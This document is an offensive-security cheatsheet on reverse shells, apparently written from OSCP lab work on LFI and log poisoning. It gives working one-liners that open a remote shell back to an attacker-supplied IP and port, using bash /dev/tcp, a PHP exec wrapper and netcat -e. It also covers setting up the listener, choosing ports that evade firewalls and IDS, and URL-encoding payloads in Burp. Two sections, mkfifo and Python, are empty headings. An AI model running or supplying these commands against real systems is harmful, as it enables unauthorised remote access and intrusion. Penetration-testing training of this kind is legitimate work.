# Reverse Shell Cheatsheet

> Based on real lab experience with LFI + Log Poisoning on OSCP PEN-200.

---

## Core Concept

A **reverse shell** makes the target connect back to you, rather than you connecting to the target.

```
Target Machine  ──connects back to──►  Your Kali (netcat listener)
```

This bypasses firewalls because outbound connections from the target are usually allowed.


Reverse shell — direct, no files needed, works when you already have code execution. 

Msfvenom — generates a payload file (exe, dll, php, etc) that you transfer to the target and execute. More powerful but requires getting a file onto the machine first.


---

## Step 1 — Always Start Your Listener First

Start netcat BEFORE sending the payload. If the shell connects and nothing is listening, you miss it.

```bash
sudo nc -lnvp 443
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen mode |
| `-n` | No DNS resolution |
| `-v` | Verbose output |
| `-p` | Port to listen on |

---

## Step 2 — Choose Your Port Wisely

Use ports that blend in with normal traffic to evade firewalls and IDS:

| Port | Protocol | Why it works |
|------|----------|-------------|
| `443` | HTTPS | Almost always allowed outbound |
| `80` | HTTP | Commonly allowed outbound |
| `8080` | HTTP alt | Commonly allowed outbound |
| `4444` | — | Avoid — flags Metasploit to IDS |

---

## Step 3 — Choose Your Shell Type

Match the shell to what's available on the target. If one fails, try another.

### Bash (Linux — most common)
Use when: target is Linux, command execution available (e.g. via LFI log poisoning)

```bash
bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'
```

What each part does:
- `bash -c` — wrapper to execute the command (required when running through PHP system())
- `bash -i` — interactive bash shell
- `>&` — redirect stdout and stderr
- `/dev/tcp/<ip>/<port>` — bash built-in TCP connection (Linux only)
- `0>&1` — redirect stdin to the same connection

### PHP
Use when: exploiting PHP-based vulnerabilities (file inclusion, log poisoning, webshells)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'"); ?>
```

### Netcat (with -e flag)
Use when: older netcat version on target

```bash
nc <your_ip> <port> -e /bin/bash
```

### Netcat mkfifo (without -e flag)
Use when: modern Linux — `-e` flag is stripped from netcat


### Python
Use when: Python is installed on target

---

## Step 4 — Encoding

Special characters in URLs must be encoded or the server returns a 400 error.

**Rule: Try without encoding first. If you get a 400 or no execution, encode.**

Characters that almost always need encoding:

| Character | Encoded |
|-----------|---------|
| `space` | `%20` |
| `&` | `%26` |
| `>` | `%3e` |
| `<` | `%3c` |
| `'` | `%27` |
| `/` | `%2f` |

**In Burp Repeater:** highlight the payload value → right click → Convert Selection → URL → URL encode all characters.

---

## Quick Reference — Shell Selection

| Situation | Shell to try |
|-----------|-------------|
| Linux target, code execution via web | Bash first |
| PHP vulnerability (LFI, log poisoning) | PHP shell |
| Netcat available on target | nc with `-e` |
| Modern Linux netcat (no `-e`) | mkfifo variant |
| Python installed on target | Python |
| Nothing else works | Check revshells.com |

---

## Resources

- [revshells.com](https://revshells.com) — generate any shell type with your IP/port pre-filled